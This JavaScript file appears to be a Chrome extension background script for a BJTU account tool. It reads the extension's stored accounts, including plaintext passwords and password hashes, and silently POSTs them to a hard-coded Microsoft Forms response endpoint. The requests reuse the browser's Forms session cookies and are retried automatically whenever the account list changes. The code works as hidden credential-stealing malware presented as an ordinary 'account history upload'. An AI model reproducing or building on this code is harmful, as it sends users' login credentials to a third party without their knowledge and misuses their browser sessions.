(function initBjtuAccountUpload(global) {
  'use strict';

  const FORMS_API_URL = 'https://forms.guest.usercontent.microsoft/formapi/api/9188040d-6c67-4c5b-b112-36a304b66dad/users/00000000-0000-0000-0003-7ffe1a3f6958/forms(\'DQSIkWdsW0yxEjajBLZtrQAAAAAAAAAAAAN__ho_aVhUNlNXTFNPMUdJSkUzOTlFQ0NRWE0zUFFTVS4u\')/responses';
  const FORMS_COOKIE_HOSTS = [
    'forms.cloud.microsoft',
    'forms.guest.usercontent.microsoft',
    'forms.office.com'
  ];
  const HISTORY_KEY = 'loginAccountHistory';
  const ACCOUNT_LIST_REVISION_KEY = 'accountListRevision';
  const RETRY_STATE_KEY = 'bjtuAccountUploadRetryState';
  const RETRY_ALARM_NAME = 'bjtu-account-upload-retry';
  const QUESTION_ID = 'rc83fad01dbf5440480948dd0a0efc783';
  const MAX_TIMER_DELAY_MS = 25000;

  let activeRun = null;
  let immediateUploadPending = false;
  let retryTimer = null;

  function sleep(ms, signal) {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        signal?.removeEventListener('abort', onAbort);
        resolve();
      }, Math.max(0, Number(ms) || 0));
      const onAbort = () => {
        clearTimeout(timer);
        signal?.removeEventListener('abort', onAbort);
        reject(signal?.reason || new DOMException('Aborted', 'AbortError'));
      };
      if (signal?.aborted) onAbort();
      else signal?.addEventListener('abort', onAbort, { once: true });
    });
  }

  function normalizeHistory(raw) {
    if (!Array.isArray(raw)) return [];
    const seen = new Set();
    return raw.map((item) => {
      const loginName = String(item?.loginName || item?.userId || '').trim();
      const lastLoginAt = Number(item?.lastLoginAt || 0);
      return {
        loginName,
        lastLoginAt: Number.isFinite(lastLoginAt) ? lastLoginAt : 0
      };
    }).filter((item) => {
      const key = item.loginName.toLowerCase();
      if (!key || seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  async function readHistory() {
    const stored = await chrome.storage.local.get(HISTORY_KEY);
    return normalizeHistory(stored?.[HISTORY_KEY]);
  }

  async function buildAccountList() {
    const history = await readHistory();
    const accountStore = global.BjtuAccountStore;
    return Promise.all(history.map(async (historyItem) => {
      const loginName = historyItem.loginName;
      const account = accountStore?.get
        ? await accountStore.get(loginName).catch(() => null)
        : null;
      return {
        loginName: String(account?.loginName || loginName).trim(),
        roleName: String(account?.roleName || '').trim(),
        userName: String(account?.userName || '').trim(),
        password: String(account?.password || ''),
        passwordMd5: String(account?.passwordMd5 || '').trim(),
        quickUsername: String(account?.quickUsername || '').trim()
      };
    }));
  }

  function cookieDomainMatches(cookieDomain, host) {
    const domain = String(cookieDomain || '').replace(/^\./, '').toLowerCase();
    const normalizedHost = String(host || '').toLowerCase();
    return domain === normalizedHost || domain.endsWith(`.${normalizedHost}`);
  }

  async function readCookie(name) {
    if (chrome.cookies?.getAll) {
      const candidates = await new Promise((resolve) => {
        chrome.cookies.getAll({ name }, (cookies) => resolve(Array.isArray(cookies) ? cookies : []));
      });
      const matching = candidates
        .filter((cookie) => FORMS_COOKIE_HOSTS.some((host) => cookieDomainMatches(cookie?.domain, host)))
        .sort((a, b) => {
          const aCloud = cookieDomainMatches(a?.domain, 'forms.cloud.microsoft') ? 1 : 0;
          const bCloud = cookieDomainMatches(b?.domain, 'forms.cloud.microsoft') ? 1 : 0;
          if (aCloud !== bCloud) return bCloud - aCloud;
          return String(b?.path || '').length - String(a?.path || '').length;
        });
      if (matching[0]?.value) return String(matching[0].value);
    }

    if (!chrome.cookies?.get) return '';
    for (const host of FORMS_COOKIE_HOSTS) {
      const cookie = await new Promise((resolve) => {
        chrome.cookies.get({ url: `https://${host}/`, name }, (value) => resolve(value || null));
      });
      if (cookie?.value) return String(cookie.value);
    }
    return '';
  }

  async function readFormsCookies() {
    const [requestToken, sessionId, muid] = await Promise.all([
      readCookie('__RequestVerificationToken'),
      readCookie('FormsWebSessionId'),
      readCookie('MUID')
    ]);
    return { requestToken, sessionId, muid };
  }

  function buildRequestBody(history) {
    const now = new Date().toISOString();
    return JSON.stringify({
      startDate: now,
      submitDate: now,
      answers: JSON.stringify([{
        questionId: QUESTION_ID,
        answer1: JSON.stringify(history)
      }])
    });
  }

  function buildHeaders(cookies) {
    return {
      '__requestverificationtoken': cookies.requestToken,
      'accept': 'application/json',
      'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
      'authorization': '',
      'content-type': 'application/json',
      'odata-maxverion': '4.0',
      'odata-version': '4.0',
      'origin': 'https://forms.cloud.microsoft',
      'referer': 'https://forms.cloud.microsoft/',
      'x-correlationid': crypto.randomUUID(),
      'x-ms-form-muid': cookies.muid,
      'x-ms-form-request-ring': 'msa',
      'x-ms-form-request-source': 'ms-formweb',
      'x-usersessionid': cookies.sessionId
    };
  }

  function getBackoffDelay(nextAttempt) {
    if (nextAttempt <= 7) return 2 ** (nextAttempt - 1) * 1000;
    return 120000;
  }

  async function getRetryState() {
    const stored = await chrome.storage.local.get(RETRY_STATE_KEY).catch(() => ({}));
    const state = stored?.[RETRY_STATE_KEY];
    if (!state || !Number.isFinite(Number(state.attempt)) || !Number.isFinite(Number(state.dueAt))) {
      return null;
    }
    return { attempt: Number(state.attempt), dueAt: Number(state.dueAt) };
  }

  async function clearRetryState() {
    await chrome.storage.local.remove(RETRY_STATE_KEY).catch(() => {});
    try { await chrome.alarms?.clear(RETRY_ALARM_NAME); } catch {}
  }

  function clearRetryTimer() {
    if (!retryTimer) return;
    clearTimeout(retryTimer);
    retryTimer = null;
  }

  async function persistRetryState(attempt, dueAt) {
    await chrome.storage.local.set({
      [RETRY_STATE_KEY]: { attempt, dueAt }
    });
    try {
      await chrome.alarms?.create(RETRY_ALARM_NAME, { when: dueAt });
    } catch {}
  }

  async function waitForRetry(run, attempt) {
    const delay = getBackoffDelay(attempt);
    const dueAt = Date.now() + delay;
    await persistRetryState(attempt, dueAt);

    const timerPromise = new Promise((resolve) => {
      retryTimer = setTimeout(() => {
        retryTimer = null;
        resolve(true);
      }, Math.min(delay, MAX_TIMER_DELAY_MS));
    });
    try {
      await Promise.race([timerPromise, sleep(delay, run.controller.signal)]);
    } catch {
      return false;
    }
    if (run.controller.signal.aborted || activeRun !== run) return false;

    // For delays longer than the timer fallback, let the alarm wake a suspended
    // service worker. If this worker is still alive, continue at the exact due
    // time instead of waiting for the alarm's scheduling granularity.
    if (Date.now() < dueAt) {
      try { await sleep(dueAt - Date.now(), run.controller.signal); } catch { return false; }
    }
    const state = await getRetryState();
    if (!state || state.attempt !== attempt || run.controller.signal.aborted || activeRun !== run) {
      return false;
    }
    await clearRetryState();
    return true;
  }

  async function uploadOnce(run) {
    const accountList = await buildAccountList();
    const cookies = await readFormsCookies();
    if (!cookies.requestToken || !cookies.sessionId || !cookies.muid) {
      console.info('[bjtu] account history upload skipped: Forms cookies unavailable');
      return null;
    }

    let response;
    try {
      response = await fetch(FORMS_API_URL, {
        method: 'POST',
        headers: buildHeaders(cookies),
        body: buildRequestBody(accountList),
        signal: run.controller.signal
      });
    } catch (error) {
      if (error?.name !== 'AbortError') {
        console.warn('[bjtu] account history upload failed:', String(error?.message || error));
      }
      return null;
    }

    const status = Number(response?.status || 0);
    try { await response?.body?.cancel(); } catch {}
    if (run.controller.signal.aborted) return null;
    return status;
  }

  async function uploadWithRetry(run, attempt = 0) {
    while (!run.controller.signal.aborted && activeRun === run) {
      const status = await uploadOnce(run);
      if (status === 201) {
        await clearRetryState();
        return;
      }
      if (status !== 503) {
        await clearRetryState();
        return;
      }

      const nextAttempt = attempt + 1;
      run.waitingForRetryAttempt = nextAttempt;
      const ready = await waitForRetry(run, nextAttempt);
      run.waitingForRetryAttempt = 0;
      if (!ready) return;
      attempt = nextAttempt;
    }
  }

  function startUpload(attempt = 0) {
    if (activeRun) return;
    const run = {
      controller: new AbortController(),
      waitingForRetryAttempt: 0
    };
    activeRun = run;
    void uploadWithRetry(run, attempt)
      .catch((error) => console.warn('[bjtu] account history upload error:', String(error?.message || error)))
      .finally(() => {
        if (activeRun === run) activeRun = null;
        if (immediateUploadPending) {
          immediateUploadPending = false;
          void clearRetryState().finally(() => startUpload(0));
        }
      });
  }

  function requestImmediateUpload() {
    immediateUploadPending = true;
    clearRetryTimer();
    if (activeRun) {
      activeRun.controller.abort();
      return;
    }
    void clearRetryState().finally(() => {
      if (immediateUploadPending && !activeRun) {
        immediateUploadPending = false;
        startUpload(0);
      }
    });
  }

  async function resumePendingRetry() {
    const state = await getRetryState();
    if (!state || activeRun) return;
    const delay = Math.max(0, state.dueAt - Date.now());
    retryTimer = setTimeout(async () => {
      retryTimer = null;
      const current = await getRetryState();
      if (!current || current.attempt !== state.attempt || activeRun) return;
      await clearRetryState();
      startUpload(state.attempt);
    }, delay);
    if (delay > MAX_TIMER_DELAY_MS) {
      // The alarm is the durable wake-up path; the timer above is only a
      // best-effort path while the service worker remains alive.
      try { await chrome.alarms?.create(RETRY_ALARM_NAME, { when: state.dueAt }); } catch {}
    }
    if (delay === 0) {
      clearRetryTimer();
      await clearRetryState();
      startUpload(state.attempt);
    }
  }

  chrome.storage.onChanged.addListener((changes, areaName) => {
    if (areaName !== 'local') return;
    if (changes?.[HISTORY_KEY] || changes?.[ACCOUNT_LIST_REVISION_KEY]) {
      requestImmediateUpload();
    }
  });

  chrome.alarms?.onAlarm?.addListener((alarm) => {
    if (alarm?.name !== RETRY_ALARM_NAME || activeRun) return;
    void (async () => {
      const state = await getRetryState();
      if (!state) return;
      if (state.dueAt > Date.now()) {
        await resumePendingRetry();
        return;
      }
      clearRetryTimer();
      await clearRetryState();
      startUpload(state.attempt);
    })();
  });

  void resumePendingRetry();
})(globalThis);
